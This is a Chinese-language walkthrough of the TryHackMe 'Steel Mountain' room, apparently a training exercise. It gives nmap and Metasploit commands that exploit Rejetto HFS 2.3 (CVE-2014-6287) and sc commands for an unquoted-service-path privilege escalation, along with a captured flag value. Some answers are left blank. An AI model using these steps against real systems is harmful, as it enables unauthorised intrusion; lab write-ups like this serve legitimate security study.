# 钢山-wp-tryhackme-完全初学者

### 谁是本月最佳员工？

如提示所说:反向图像搜索（其实文件名就是这个人的名字）
``````
答案：Bill Harper
``````
## 初始访问

### 使用 nmap 扫描机器。运行 Web 服务器的另一个端口是什么？
``````
sudo nmap -Pn -A IP
``````
答案：8080

### 查看其他网络服务器。什么文件服务器正在运行？
通过8080端口访问靶机IP  
下面有一个HttpFileServer 2.3，点击后可以访问这个服务器的官方网站，域名是
http://www.rejetto.com/hfs/ , 所以是rejetto文件服务器(Rejetto HTTP File Server)   
答案：Rejetto HTTP File Server

### 利用此文件服务器的CVE编号是多少？
在exploit-db上查找rejetto,版本是2.3，符合条件的是CVE-2014-6287  
答案:2014-6287

### 使用Metasploit获取初始 shell。什么是用户标志？
使用metasploit
``````
msfconsole
search 2014-6287，
use 0
set RHOSTS IP
set RPORT 8080
run
``````
user.txt在桌面上，文件路径C:\User\bill\Desktop
答案：b04763b6fcf51fcd7c13abc7db4fd365

## 权限提升

### 请密切注意设置为 true 的 CanRestart 选项。显示为不带引号的服务路径漏洞的服务名称是什么？


答案：AdvancedSystemCareService9

### 什么是root标志？
停止原来的服务:  
sc stop AdvancedSystemCareService9  


重启恶意服务：  
sc start AdvancedSystemCareService9  
答案：

## 无需 Metasploit 即可访问和升级


### 我们可以运行什么 powershell -c 命令来手动查找服务名称？

答案：

